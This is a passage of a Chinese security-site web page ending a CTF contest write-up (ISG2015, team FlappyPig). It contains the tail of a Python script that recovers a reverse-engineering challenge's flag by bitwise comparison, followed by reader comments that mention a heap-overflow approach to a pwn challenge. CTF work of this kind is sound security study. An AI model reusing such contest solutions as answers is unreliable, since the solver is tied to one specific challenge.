&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;(v30[index]&nbsp;&amp;&nbsp;0xF6)&nbsp;|&nbsp;~v30[index]&nbsp;&amp;&nbsp;9;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;v13
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;v13&nbsp;==&nbsp;aNzRol68hviis8q[index]:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;index,&nbsp;&quot;find&nbsp;one:&quot;,chr(v30[index])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;sign&nbsp;==&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sign&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sign&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#value
print&nbsp;v30
v30&nbsp;=&nbsp;[chr(c)&nbsp;for&nbsp;c&nbsp;in&nbsp;v30]
print&nbsp;&quot;&quot;.join(v30)</pre><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">flag:</span></p><p style="text-indent: 28px; text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p6.qhimg.com/t0124fdbe1c65a61e0f.png" src="http://p4.qhimg.com/t01a686ed9f51794982.png" title="t0124fdbe1c65a61e0f.png"/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/702.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="ISG2015 FlappyPig Writeup - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="702" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1200" user-name="互撸娃" href="javascript:;">
                互撸娃            </a>
                        <span class="comment-time">2015-10-22 00:47:48</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1200">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1200" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">求大神堆溢出方法！</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="0" data-target="1177">死水微澜</a> <span class="comment-time">2015-10-21 15:23:27</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1177">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1177" data-type="comment">点赞</a></span>            </div>
            <p>看了 pwn400，真想一头撞死……竟然就这么水掉了，根本没想 realloc 失败直接可以写到这种大地址……堆溢绕了无数圈才绕出来真是心都碎了……</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/0x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1177" user-name="死水微澜" href="javascript:;">
                死水微澜            </a>
                        <span class="comment-time">2015-10-21 15:23:27</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1177">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1177" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">看了 pwn400，真想一头撞死……竟然就这么水掉了，根本没想 realloc 失败直接可以写到这种大地址……堆溢绕了无数圈才绕出来真是心都碎了……</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1163" user-name="带头大哥的小弟" href="javascript:;">
                带头大哥的小弟            </a>
                        <span class="comment-time">2015-10-20 22:51:49</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1163">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1163" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">大神就是大神！</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/3x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1161" user-name="优衣库女主唐国强" href="javascript:;">
                优衣库女主唐国强            </a>
                        <span class="comment-time">2015-10-20 16:27:32</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1161">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1161" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">牛逼啊！！！！！！！！</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/0x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1159" user-name="sandikas" href="javascript:;">
                sandikas            </a>
                        <span class="comment-time">2015-10-20 15:59:13</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1159">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1159" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">沙发。。。法克大神</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="702" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
